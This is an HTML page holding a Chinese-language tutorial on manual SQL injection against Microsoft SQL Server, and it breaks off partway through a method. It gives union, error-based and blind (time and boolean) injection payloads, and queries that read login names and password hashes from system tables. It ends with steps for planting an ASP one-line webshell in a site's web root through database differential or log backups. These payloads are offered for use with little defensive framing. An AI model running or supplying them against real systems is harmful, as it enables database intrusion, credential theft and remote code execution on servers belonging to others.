<!doctype html><html><head>
<meta charset="utf-8">
<title>Markdoc Preview</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style type="text/css">/*! normalize.css v3.0.1 | MIT License | git.io/normalize */

/**
 * 1. Set default font family to sans-serif.
 * 2. Prevent iOS text size adjust after orientation change, without disabling
 *    user zoom.
 */

html {
  font-family: sans-serif; /* 1 */
  -ms-text-size-adjust: 100%; /* 2 */
  -webkit-text-size-adjust: 100%; /* 2 */
}

/**
 * Remove default margin.
 */

body {
  margin: 0;
}

/* HTML5 display definitions
   ========================================================================== */

/**
 * Correct `block` display not defined for any HTML5 element in IE 8/9.
 * Correct `block` display not defined for `details` or `summary` in IE 10/11 and Firefox.
 * Correct `block` display not defined for `main` in IE 11.
 */

article,
aside,
details,
figcaption,
figure,
footer,
header,
hgroup,
main,
nav,
section,
summary {
  display: block;
}

/**
 * 1. Correct `inline-block` display not defined in IE 8/9.
 * 2. Normalize vertical alignment of `progress` in Chrome, Firefox, and Opera.
 */

audio,
canvas,
progress,
video {
  display: inline-block; /* 1 */
  vertical-align: baseline; /* 2 */
}

/**
 * Prevent modern browsers from displaying `audio` without controls.
 * Remove excess height in iOS 5 devices.
 */

audio:not([controls]) {
  display: none;
  height: 0;
}

/**
 * Address `[hidden]` styling not present in IE 8/9/10.
 * Hide the `template` element in IE 8/9/11, Safari, and Firefox < 22.
 */

[hidden],
template {
  display: none;
}

/* Links
   ========================================================================== */

/**
 * Remove the gray background color from active links in IE 10.
 */

a {
  background: transparent;
}

/**
 * Improve readability when focused and also mouse hovered in all browsers.
 */

a:active,
a:hover {
  outline: 0;
}

/* Text-level semantics
   ========================================================================== */

/**
 * Address styling not present in IE 8/9/10/11, Safari, and Chrome.
 */

abbr[title] {
  border-bottom: 1px dotted;
}

/**
 * Address style set to `bolder` in Firefox 4+, Safari, and Chrome.
 */

b,
strong {
  font-weight: bold;
}

/**
 * Address styling not present in Safari and Chrome.
 */

dfn {
  font-style: italic;
}

/**
 * Address variable `h1` font-size and margin within `section` and `article`
 * contexts in Firefox 4+, Safari, and Chrome.
 */

h1 {
  font-size: 2em;
  margin: 0.67em 0;
}

/**
 * Address styling not present in IE 8/9.
 */

mark {
  background: #ff0;
  color: #000;
}

/**
 * Address inconsistent and variable font size in all browsers.
 */

small {
  font-size: 80%;
}

/**
 * Prevent `sub` and `sup` affecting `line-height` in all browsers.
 */

sub,
sup {
  font-size: 75%;
  line-height: 0;
  position: relative;
  vertical-align: baseline;
}

sup {
  top: -0.5em;
}

sub {
  bottom: -0.25em;
}

/* Embedded content
   ========================================================================== */

/**
 * Remove border when inside `a` element in IE 8/9/10.
 */

img {
  border: 0;
}

/**
 * Correct overflow not hidden in IE 9/10/11.
 */

svg:not(:root) {
  overflow: hidden;
}

/* Grouping content
   ========================================================================== */

/**
 * Address margin not present in IE 8/9 and Safari.
 */

figure {
  margin: 1em 40px;
}

/**
 * Address differences between Firefox and other browsers.
 */

hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  height: 0;
}

/**
 * Contain overflow in all browsers.
 */

pre {
  overflow: auto;
}

/**
 * Address odd `em`-unit font size rendering in all browsers.
 */

code,
kbd,
pre,
samp {
  font-family: monospace, monospace;
  font-size: 1em;
}

/* Forms
   ========================================================================== */

/**
 * Known limitation: by default, Chrome and Safari on OS X allow very limited
 * styling of `select`, unless a `border` property is set.
 */

/**
 * 1. Correct color not being inherited.
 *    Known issue: affects color of disabled elements.
 * 2. Correct font properties not being inherited.
 * 3. Address margins set differently in Firefox 4+, Safari, and Chrome.
 */

button,
input,
optgroup,
select,
textarea {
  color: inherit; /* 1 */
  font: inherit; /* 2 */
  margin: 0; /* 3 */
}

/**
 * Address `overflow` set to `hidden` in IE 8/9/10/11.
 */

button {
  overflow: visible;
}

/**
 * Address inconsistent `text-transform` inheritance for `button` and `select`.
 * All other form control elements do not inherit `text-transform` values.
 * Correct `button` style inheritance in Firefox, IE 8/9/10/11, and Opera.
 * Correct `select` style inheritance in Firefox.
 */

button,
select {
  text-transform: none;
}

/**
 * 1. Avoid the WebKit bug in Android 4.0.* where (2) destroys native `audio`
 *    and `video` controls.
 * 2. Correct inability to style clickable `input` types in iOS.
 * 3. Improve usability and consistency of cursor style between image-type
 *    `input` and others.
 */

button,
html input[type="button"], /* 1 */
input[type="reset"],
input[type="submit"] {
  -webkit-appearance: button; /* 2 */
  cursor: pointer; /* 3 */
}

/**
 * Re-set default cursor for disabled elements.
 */

button[disabled],
html input[disabled] {
  cursor: default;
}

/**
 * Remove inner padding and border in Firefox 4+.
 */

button::-moz-focus-inner,
input::-moz-focus-inner {
  border: 0;
  padding: 0;
}

/**
 * Address Firefox 4+ setting `line-height` on `input` using `!important` in
 * the UA stylesheet.
 */

input {
  line-height: normal;
}

/**
 * It's recommended that you don't attempt to style these elements.
 * Firefox's implementation doesn't respect box-sizing, padding, or width.
 *
 * 1. Address box sizing set to `content-box` in IE 8/9/10.
 * 2. Remove excess padding in IE 8/9/10.
 */

input[type="checkbox"],
input[type="radio"] {
  box-sizing: border-box; /* 1 */
  padding: 0; /* 2 */
}

/**
 * Fix the cursor style for Chrome's increment/decrement buttons. For certain
 * `font-size` values of the `input`, it causes the cursor style of the
 * decrement button to change from `default` to `text`.
 */

input[type="number"]::-webkit-inner-spin-button,
input[type="number"]::-webkit-outer-spin-button {
  height: auto;
}

/**
 * 1. Address `appearance` set to `searchfield` in Safari and Chrome.
 * 2. Address `box-sizing` set to `border-box` in Safari and Chrome
 *    (include `-moz` to future-proof).
 */

input[type="search"] {
  -webkit-appearance: textfield; /* 1 */
  -moz-box-sizing: content-box;
  -webkit-box-sizing: content-box; /* 2 */
  box-sizing: content-box;
}

/**
 * Remove inner padding and search cancel button in Safari and Chrome on OS X.
 * Safari (but not Chrome) clips the cancel button when the search input has
 * padding (and `textfield` appearance).
 */

input[type="search"]::-webkit-search-cancel-button,
input[type="search"]::-webkit-search-decoration {
  -webkit-appearance: none;
}

/**
 * Define consistent border, margin, and padding.
 */

fieldset {
  border: 1px solid #c0c0c0;
  margin: 0 2px;
  padding: 0.35em 0.625em 0.75em;
}

/**
 * 1. Correct `color` not being inherited in IE 8/9/10/11.
 * 2. Remove padding so people aren't caught out if they zero out fieldsets.
 */

legend {
  border: 0; /* 1 */
  padding: 0; /* 2 */
}

/**
 * Remove default vertical scrollbar in IE 8/9/10/11.
 */

textarea {
  overflow: auto;
}

/**
 * Don't inherit the `font-weight` (applied by a rule above).
 * NOTE: the default cannot safely be changed in Chrome and Safari on OS X.
 */

optgroup {
  font-weight: bold;
}

/* Tables
   ========================================================================== */

/**
 * Remove most spacing between table cells.
 */

table {
  border-collapse: collapse;
  border-spacing: 0;
}

td,
th {
  padding: 0;
}

/* mscore */
* {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}
*:before,
*:after {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}
html {
  font-size: 62.5%;
  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
}
body {
  /*font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;*/
  font-family: 'Helvetica Neue', Helvetica, Arial, 'Microsoft Yahei', sans-serif;
  font-size: 14px;
  line-height: 1.42857143;
  color: #333333;
  background-color: #ffffff;
}
input,
button,
select,
textarea {
  font-family: inherit;
  font-size: inherit;
  line-height: inherit;
}
a {
  color: #428bca;
  text-decoration: none;
}
a:hover,
a:focus {
  color: #2a6496;
  text-decoration: underline;
}
a:focus {
  outline: thin dotted;
  outline: 5px auto -webkit-focus-ring-color;
  outline-offset: -2px;
}
figure {
  margin: 0;
}
img {
  vertical-align: middle;
}

/*
Original style from softwaremaniacs.org (c) Ivan Sagalaev <Maniac@SoftwareManiacs.Org>
*/

.hljs {
  display: block;
  overflow-x: auto;
  padding: 0.5em;
  background: #f0f0f0;
  -webkit-text-size-adjust: none;
}

.hljs,
.hljs-subst,
.hljs-tag .hljs-title,
.nginx .hljs-title {
  color: black;
}

.hljs-string,
.hljs-title,
.hljs-constant,
.hljs-parent,
.hljs-tag .hljs-value,
.hljs-rules .hljs-value,
.hljs-preprocessor,
.hljs-pragma,
.haml .hljs-symbol,
.ruby .hljs-symbol,
.ruby .hljs-symbol .hljs-string,
.hljs-template_tag,
.django .hljs-variable,
.smalltalk .hljs-class,
.hljs-addition,
.hljs-flow,
.hljs-stream,
.bash .hljs-variable,
.apache .hljs-tag,
.apache .hljs-cbracket,
.tex .hljs-command,
.tex .hljs-special,
.erlang_repl .hljs-function_or_atom,
.asciidoc .hljs-header,
.markdown .hljs-header,
.coffeescript .hljs-attribute {
  color: #800;
}

.smartquote,
.hljs-comment,
.hljs-annotation,
.diff .hljs-header,
.hljs-chunk,
.asciidoc .hljs-blockquote,
.markdown .hljs-blockquote {
  color: #888;
}

.hljs-number,
.hljs-date,
.hljs-regexp,
.hljs-literal,
.hljs-hexcolor,
.smalltalk .hljs-symbol,
.smalltalk .hljs-char,
.go .hljs-constant,
.hljs-change,
.lasso .hljs-variable,
.makefile .hljs-variable,
.asciidoc .hljs-bullet,
.markdown .hljs-bullet,
.asciidoc .hljs-link_url,
.markdown .hljs-link_url {
  color: #080;
}

.hljs-label,
.hljs-javadoc,
.ruby .hljs-string,
.hljs-decorator,
.hljs-filter .hljs-argument,
.hljs-localvars,
.hljs-array,
.hljs-attr_selector,
.hljs-important,
.hljs-pseudo,
.hljs-pi,
.haml .hljs-bullet,
.hljs-doctype,
.hljs-deletion,
.hljs-envvar,
.hljs-shebang,
.apache .hljs-sqbracket,
.nginx .hljs-built_in,
.tex .hljs-formula,
.erlang_repl .hljs-reserved,
.hljs-prompt,
.asciidoc .hljs-link_label,
.markdown .hljs-link_label,
.vhdl .hljs-attribute,
.clojure .hljs-attribute,
.asciidoc .hljs-attribute,
.lasso .hljs-attribute,
.coffeescript .hljs-property,
.hljs-phony {
  color: #88f;
}

.hljs-keyword,
.hljs-id,
.hljs-title,
.hljs-built_in,
.css .hljs-tag,
.hljs-javadoctag,
.hljs-phpdoc,
.hljs-dartdoc,
.hljs-yardoctag,
.smalltalk .hljs-class,
.hljs-winutils,
.bash .hljs-variable,
.apache .hljs-tag,
.hljs-type,
.hljs-typename,
.tex .hljs-command,
.asciidoc .hljs-strong,
.markdown .hljs-strong,
.hljs-request,
.hljs-status {
  font-weight: bold;
}

.asciidoc .hljs-emphasis,
.markdown .hljs-emphasis {
  font-style: italic;
}

.nginx .hljs-built_in {
  font-weight: normal;
}

.coffeescript .javascript,
.javascript .xml,
.lasso .markup,
.tex .hljs-formula,
.xml .javascript,
.xml .vbscript,
.xml .css,
.xml .hljs-cdata {
  opacity: 0.5;
}
#container {
  padding: 15px;
  margin-left:20px;
}
pre {
  border: 1px solid #ccc;
  border-radius: 4px;
  display: block;
}
pre code {
  white-space: pre-wrap;
}
.hljs,
code {
  font-family: Monaco, Menlo, Consolas, 'Courier New', monospace;
}

pre{
  background-color: #dddddd;
  padding:8px 0px 8px 30px;
  word-wrap: break-word;
}
table tbody tr:nth-child(2n) {
    background: rgba(158,188,226,0.12); 
}
:not(pre) > code {
  padding: 2px 4px;
  font-size: 90%;
  color: #c7254e;
  background-color: #f9f2f4;
  white-space: nowrap;
  border-radius: 4px;
}
th, td {
  border: 1px solid #ccc;
  padding: 6px 12px;
}
blockquote {
    border-left-width: 10px;
    background-color: rgba(102,128,153,0.05);
    border-top-right-radius: 5px;
    border-bottom-right-radius: 5px;
    padding: 1px 20px
}
blockquote.pull-right small:before,blockquote.pull-right .small:before {
    content: ''
}

blockquote.pull-right small:after,blockquote.pull-right .small:after {
    content: '\00A0 \2014'
}

blockquote:before,blockquote:after {
    content: ""
}
blockquote {
    margin: 0 0 1.1em
}
blockquote p {
    margin-bottom: 1.1em;
    font-size: 1em;
    line-height: 1.45
}

blockquote ul:last-child,blockquote ol:last-child {
    margin-bottom: 0
}
blockquote {
    margin: 0 0 21px;
    border-left: 10px solid #dddddd;
}</style></head>
<body marginwidth="0" marginheight="0">
<div id="container"><h2 id="mssql">Mssql</h2>
<ul>
<li><p>Mssql服务的端口是1433</p>
</li>
<li><p>需要注意一些与MySQL语法不同的地方</p>
</li>
<li>管理员账号是sa</li>
</ul>
<h4 id="-">基本信息</h4>
<ol>
<li><p>数据库增删</p>
<ul>
<li>CREATE DATABSE <code>database</code></li>
<li>DROP DATABASE <code>database</code></li>
</ul>
</li>
<li><p>数据查询</p>
<ul>
<li>select <code>column</code> from <code>table</code></li>
</ul>
</li>
<li><p>一些默认库</p>
<ul>
<li><p>master    //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作</p>
</li>
<li><p>model    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</p>
</li>
<li><p>msdb    //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息</p>
</li>
<li><p>tempdb    //它为临时表和其他临时工作提供了一个存储区。</p>
</li>
</ul>
<p>master数据库是注入时主要操作的数据库,储存了我们的所有数据库名等等，还有很多储存过程。类似MySQL的information_schema。</p>
</li>
</ol>
<h4 id="-">注释符</h4>
<table>
<thead>
<tr>
<th>/*</th>
<th>多行注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>--</td>
<td>单行注释</td>
</tr>
<tr>
<td>;00%</td>
<td>access数据库可用</td>
</tr>
</tbody>
</table>
<h4 id="-">版本号</h4>
<p>@@VERSION</p>
<h4 id="-">数据库用户密码查询</h4>
<table>
<thead>
<tr>
<th>数据库和表</th>
<th>master..syslogins, master..sysprocesses</th>
</tr>
</thead>
<tbody>
<tr>
<td>列名</td>
<td>name, loginame</td>
</tr>
<tr>
<td>当前用户</td>
<td>user, system_user, suser_sname(), is_srvrolemember(‘sysadmin’)</td>
</tr>
<tr>
<td>数据库凭据</td>
<td>SELECT user, password FROM master.dbo.sysxlogins</td>
</tr>
</tbody>
</table>
<h5 id="-">查询当前用户</h5>
<pre><code class="hljssql"><span class="hljs-operator"><span class="hljs-keyword">SELECT</span> loginame <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysprocesses <span class="hljs-keyword">WHERE</span> spid=@@SPID;</span>
</code></pre>
<h4 id="-">数据库名查询</h4>
<table>
<thead>
<tr>
<th>数据库和表</th>
<th>master..sysdatabases</th>
</tr>
</thead>
<tbody>
<tr>
<td>列</td>
<td>name</td>
</tr>
<tr>
<td>函数（返回当前数据库名）</td>
<td>DB_NAME(i)</td>
</tr>
</tbody>
</table>
<h5 id="-">查数据库名</h5>
<pre><code class="hljssql"><span class="hljs-operator"><span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysdatabases;</span>
</code></pre>
<h5 id="-">查当前数据库</h5>
<pre><code class="hljssql"><span class="hljs-operator"><span class="hljs-keyword">SELECT</span> DB_NAME(<span class="hljs-number">5</span>);</span>
</code></pre>
<h4 id="-">表名查询</h4>
<p>表名可以在<code>information_schema.tables</code> 或 <code>master..sysobjects</code>中查询到</p>
<pre><code class="hljssql">UNION <span class="hljs-operator"><span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysobjects <span class="hljs-keyword">WHERE</span> xtype=<span class="hljs-string">'U'</span></span>
</code></pre>
<p>tips：xtype可以是下列对象类型中的一种： C = CHECK 约束　　D = 默认值或 DEFAULT 约束　　F = FOREIGN KEY 约束　　L = 日志　　FN = 标量函数 IF = 内嵌表函数 　　P = 存储过程 　　PK = PRIMARY KEY 约束（类型是 K） 　　RF = 复制筛选存储过程 S = 系统表 　　TF = 表函数 　　TR = 触发器 　　U = 用户表 UQ = UNIQUE 约束（类型是 K） V = 视图 　　X = 扩展存储过程</p>
<h4 id="-">列名查询</h4>
<p>列名可以i在<code>information_schema.columns</code> 或 <code>masters..syscolumns</code>中查询到</p>
<pre><code class="hljssql">UNION <span class="hljs-operator"><span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..syscolumns <span class="hljs-keyword">WHERE</span> id = (<span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..syscolumns <span class="hljs-keyword">WHERE</span> name = <span class="hljs-string">'tablename'</span>)</span>
</code></pre>
<h2 id="mssql-">Mssql手工注入流程</h2>
<ol>
<li><p>判断注入</p>
<pre><code class="hljssql"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/www.example.com/</span><span class="hljs-number">1</span>.asp?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>
<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/www.example.com/</span><span class="hljs-number">1</span>.asp?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span>
</code></pre>
</li>
<li><p>判断数据库系统</p>
<pre><code class="hljssql">and (<span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> sysobjects) &gt;<span class="hljs-number">0</span> （回显正常说明是msSQL）
<span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> msysobjects) &gt;<span class="hljs-number">0</span> （回显正常说明是access）</span>
</code></pre>
</li>
<li><p>获取数据库信息</p>
<pre><code class="hljssql"><span class="hljs-title">and</span> <span class="hljs-number">1</span>=(<span class="hljs-built_in">select</span> @<span class="hljs-variable">@version</span>)
</code></pre>
</li>
<li><p>获取数据库名</p>
<pre><code class="hljssql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> db_name())
</code></pre>
</li>
<li><p>获取表名</p>
<pre><code class="hljssql">and (<span class="hljs-operator"><span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> <span class="hljs-string">`database`</span>.sys.all_objects <span class="hljs-keyword">where</span> type=<span class="hljs-string">'U'</span> <span class="hljs-keyword">AND</span> is_ms_shipped=<span class="hljs-number">0</span>)</span>
</code></pre>
</li>
<li><p>获取字段名</p>
<pre><code class="hljssql"><span class="hljs-operator"><span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> COLUMN_NAME <span class="hljs-keyword">from</span> <span class="hljs-string">`database`</span>.information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> TABLE_NAME=<span class="hljs-string">'`table`'</span></span>
</code></pre>
</li>
<li><p>获取值</p>
<pre><code class="hljssql"><span class="hljs-operator"><span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-string">`column`</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`table`</span></span>
</code></pre>
<p>这里留了一个坑，很明显这里的payload的全都不算是联合注入，那么这是什么类型的注入呢？</p>
</li>
</ol>
<pre><code class="hljssql">id=1 and (<span class="hljs-operator"><span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> test.sys.all_objects <span class="hljs-keyword">where</span> type=<span class="hljs-string">'U'</span> <span class="hljs-keyword">AND</span> is_ms_shipped=<span class="hljs-number">0</span>)&gt;<span class="hljs-number">0</span>
id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-literal">null</span>,name,<span class="hljs-literal">null</span> <span class="hljs-keyword">from</span> test.sys.sysobjects <span class="hljs-keyword">where</span> xtype =<span class="hljs-string">'U'</span></span>
</code></pre>
<p>有何区别</p>
<h2 id="-">盲注</h2>
<h4 id="-">时间盲注</h4>
<p>两种方法</p>
<ol>
<li><code>WAITFOR DELAY 'hh:mm:ss';</code></li>
<li><code>WAITFOR TIME 'hh:mm:ss';</code></li>
</ol>
<pre><code class="hljssql">if(1=(<span class="hljs-operator"><span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>))) WAITFOR DELAY <span class="hljs-string">'0:0:2'</span> //判断是否是SA权限
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>((<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> <span class="hljs-keyword">master</span>.dbo.sysdatabases),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">1</span> WAITFOR DELAY <span class="hljs-string">'0:0:5'</span><span class="hljs-comment">--      //爆破第一个数据库的第一个字符</span></span>
</code></pre>
<h4 id="-">布尔盲注</h4>
<h5 id="-mssql-">判断是否是MSSql数据库</h5>
<p>SQLServer数据库特有的表是：sysobjects，所以可以用它来判断是否是SQLServer数据库</p>
<pre><code class="hljssql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span>*from sysobjects)
</code></pre>
<h5 id="-">关于查询全部数据库</h5>
<p>虽然对于一个目标来说有点多此一举</p>
<pre><code class="hljssql">id=1 and (<span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(name) <span class="hljs-keyword">from</span> <span class="hljs-keyword">master</span>..sysdatabases)=N //调整N值进行判断
id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> <span class="hljs-keyword">master</span>..sysdatabases <span class="hljs-keyword">where</span> dbid=N)=<span class="hljs-number">1</span> //判断dbid个数，一般数据库有多少个，dbid的值就为多少</span>
</code></pre>
<p>获取全部数据库名</p>
<ol>
<li>判断长度</li>
</ol>
<pre><code class="hljssql">and <span class="hljs-function">len</span>(<span class="hljs-function">db_name</span>(7))&gt;3
and <span class="hljs-function">len</span>(<span class="hljs-function">db_name</span>(7))&gt;4
<span class="hljs-comment">//根据回显不同判断</span>
</code></pre>
<ol>
<li>逐位判断数据库名的ascii值</li>
</ol>
<pre><code class="hljssql">and <span class="hljs-function">ascii</span>(<span class="hljs-function">substring</span>(<span class="hljs-function">db_name</span>(7),1,1))&gt;100
and <span class="hljs-function">ascii</span>(<span class="hljs-function">substring</span>(<span class="hljs-function">db_name</span>(7),1,1))&gt;101
<span class="hljs-comment">//根据回显不同判断,二分法自动化爆破更快</span>
</code></pre>
<h5 id="-">查询当前数据库</h5>
<ol>
<li>判断数据库长度</li>
</ol>
<pre><code class="hljssql">and <span class="hljs-function">len</span>(<span class="hljs-function">db_name</span>())&gt;3 
and <span class="hljs-function">len</span>(<span class="hljs-function">db_name</span>())&gt;4
<span class="hljs-comment">//根据回显不同判断</span>
</code></pre>
<ol>
<li>逐位判断数据库名的ascii值</li>
</ol>
<pre><code class="hljssql">and <span class="hljs-function">ascii</span>(<span class="hljs-function">substring</span>(<span class="hljs-function">db_name</span>(),1,1))&gt;100
and <span class="hljs-function">ascii</span>(<span class="hljs-function">substring</span>(<span class="hljs-function">db_name</span>(),1,1))&gt;101
<span class="hljs-comment">//根据回显不同判断,二分法自动化爆破更快</span>
</code></pre>
<h5 id="-">查询表</h5>
<ol>
<li>判断表的个数</li>
</ol>
<pre><code class="hljssql">and (<span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(name) <span class="hljs-keyword">from</span> test..sysobjects <span class="hljs-keyword">where</span> xtype=<span class="hljs-string">'U'</span>)&gt;<span class="hljs-number">0</span>
<span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(name) <span class="hljs-keyword">from</span> test..sysobjects <span class="hljs-keyword">where</span> xtype=<span class="hljs-string">'U'</span>)&gt;<span class="hljs-number">1</span></span>
</code></pre>
<ol>
<li>查询指定表的表名
由于表的长度不能爆破出来，只能通过第N个字符的ascii值&gt;0回显仍然错误来判断，该表有N-1个字符。同时，表名均有前缀<code>dbo.</code></li>
</ol>
<pre><code class="hljssql"><span class="hljs-function">and <span class="hljs-title">ascii</span><span class="hljs-params">(substring((<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> sysobjects <span class="hljs-keyword">where</span> xtype = <span class="hljs-number">0x75</span> )</span>,1,1))&gt;</span>= <span class="hljs-number">80</span> <span class="hljs-comment">//第一个</span>
</code></pre>
<p> 这里有个缺陷，如果只是针对某个数据的库，一个个爆破太慢了</p>
<ol>
<li>查询列名</li>
</ol>
<pre><code class="hljssql"><span class="hljs-function">and <span class="hljs-title">ascii</span><span class="hljs-params">(substring((<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> syscolumns <span class="hljs-keyword">where</span> id=(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> sysobjects <span class="hljs-keyword">where</span> xtype=<span class="hljs-number">0x75</span> and name=<span class="hljs-string">'表名'</span>)</span>),N,1)) &gt;</span>= <span class="hljs-number">65</span> <span class="hljs-comment">//第一列</span>
</code></pre>
<p> 这个问题同样存在于列名爆破中</p>
<ol>
<li><p>获取列值</p>
<pre><code class="hljssql"><span class="hljs-function">and <span class="hljs-title">ascii</span><span class="hljs-params">(substring((<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> 列名 <span class="hljs-keyword">from</span> 表名)</span>,N,1)) &gt;</span>= <span class="hljs-number">65</span>
</code></pre>
</li>
</ol>
<p>手工盲注应该有更简洁的方法。</p>
<h2 id="-">报错注入</h2>
<p>mssql最经典是显示或隐式转换导致的报错。</p>
<p>显示转换，指使用转换函数进行操作；隐式转换，不使用转换函数，默认就转换。</p>
<h4 id="-">隐式转换</h4>
<p><code>id =1 and (select user)&gt;0--</code>
<code>id =1|(select user)--</code></p>
<h4 id="-">显式转换</h4>
<p>常用的函数是cast和convert</p>
<p><code>id =1 and 1=(select CAST(USER as int))</code></p>
<p><code>id=1 and 1=convert(int,(select user))</code></p>
<p>其它的函数有</p>
<ul>
<li>db_name()</li>
<li>col_name()</li>
<li>filegroup_name()</li>
<li>object_name()</li>
<li>schema_name()</li>
<li>type_name()</li>
</ul>
<h2 id="-">联合查询的注入</h2>
<p>通常手工注入的演示以基于联合查询的注入为例，但是对于mssql注入的举例中，有几步通过报错注入进行。
以传统步骤展开一次联合查询的注入是</p>
<pre><code class="hljssql">#查表 UNION <span class="hljs-operator"><span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysobjects <span class="hljs-keyword">WHERE</span> xtype=<span class="hljs-string">'U'</span>
#查列 <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..syscolumns <span class="hljs-keyword">WHERE</span> id = (<span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..syscolumns <span class="hljs-keyword">WHERE</span> name = <span class="hljs-string">'tablename'</span>)
#查值 <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> columnname <span class="hljs-keyword">from</span> tablename</span>
</code></pre>
<h2 id="-">注入利用</h2>
<p>MSSQL注入除了查询数据，还可以做：</p>
<ul>
<li>getshell</li>
<li>新建系统用户</li>
<li>开启3389服务
等</li>
</ul>
<h4 id="getshell">getshell</h4>
<p>方法一：差异备份</p>
<pre><code>  1. 完整备份一次
</code></pre><pre><code class="hljssql">   <span class="hljs-operator"><span class="hljs-keyword">backup</span> <span class="hljs-keyword">database</span> <span class="hljs-string">'dbname'</span> <span class="hljs-keyword">to</span> disk = <span class="hljs-string">'c:\backup.bak'</span>;</span>
</code></pre>
<pre><code>  2. 创建表并插入数据
</code></pre><pre><code class="hljssql">   <span class="hljs-operator"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> [dbo].[dtest] ([cmd] 
   [image]);</span><span class="hljs-comment">--</span>
   <span class="hljs-operator"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> dtest(cmd) 
   <span class="hljs-keyword">values</span>(<span class="hljs-number">0x3C25657865637574652872657175657374282261222929253E</span>);</span>
</code></pre>
<pre><code>  3. 进行差异备份
</code></pre><pre><code class="hljssql">   <span class="hljs-operator"><span class="hljs-keyword">backup</span> <span class="hljs-keyword">database</span> <span class="hljs-string">'db_name'</span> <span class="hljs-keyword">to</span> disk=<span class="hljs-string">'目标位置\webshell.asp'</span> <span class="hljs-keyword">WITH</span> DIFFERENTIAL,<span class="hljs-keyword">FORMAT</span>;</span>
</code></pre>
<p>   其中0x3C25657865637574652872657175657374282261222929253E是一句话木马的内容&lt;%execute(request("a"))%&gt;。</p>
<p>   方法二：log备份
   1.激活为还原模式
   log备份getshell需要经过数据库，需要先把指定的数据库激活为还原模式，需执行以下的payload</p>
<pre><code class="hljssql">   ?id=1;<span class="hljs-operator"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">set</span> RECOVERY <span class="hljs-keyword">FULL</span> <span class="hljs-comment">--</span></span>
</code></pre>
<p>   2.创建新的表（比如table0）</p>
<pre><code class="hljssql">   ?id=1;<span class="hljs-operator"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> table0 (a image) <span class="hljs-comment">--</span></span>
</code></pre>
<p>   3.备份当前数据库的log到网站根目录</p>
